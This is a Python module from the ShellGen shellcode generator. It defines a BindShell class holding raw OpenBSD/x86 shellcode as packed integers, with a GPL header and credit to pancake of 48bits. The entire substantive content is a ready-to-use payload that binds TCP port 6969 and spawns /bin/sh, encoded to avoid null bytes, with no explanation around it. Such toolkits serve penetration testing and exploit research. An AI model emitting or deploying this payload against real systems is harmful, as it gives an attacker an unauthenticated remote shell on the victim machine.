#!/usr/bin/env python

###############################################################################
## Bind to TCP port 6969 and execute /bin/sh in OpenBSD/x86                  ##
## Shellcode for ShellGen                                                    ##
## Based on original code by pancake from 48bits                             ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2015 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Bind to TCP port 6969 and execute /bin/sh."

__all__ = ["BindShell"]

from shellgen import Static

import struct

class BindShell (Static):
    """
    "Bind to TCP port 6969 and execute /bin/sh in OpenBSD/x86.

    Based on original code by pancake from 48bits:
    U{http://radare.org/y/}
    """

    qualities = "payload"
    encoding  = "nullfree"

    port = 6969

    # As found in the source code.
    # I'm assuming Intel byte order, but no idea until this is tested!
    longs = (
        0x4151c931,0x51514151,0x61b0c031,0x078980cd,0x4f88c931,0x0547c604,0x084f8902,
        0x0647c766,0x106a391b,0x5004478d,0x5050078b,0x68b0c031,0x016a80cd,0x5050078b,
        0x6ab0c031,0xc93180cd,0x078b5151,0xc0315050,0x80cd1eb0,0xc9310789,0x50078b51,
        0xb0c03150,0x4180cd5a,0x7503f983,0x5b23ebef,0xc9311f89,0x89074b88,0x8d51044f,
        0x078b5007,0xc0315050,0x80cd3bb0,0x5151c931,0x01b0c031,0xd8e880cd,0x2fffffff,
        0x2f6e6962,0x90416873
    )
    bytes = struct.pack("<" + ("L" * len(longs)), *longs)
    del longs
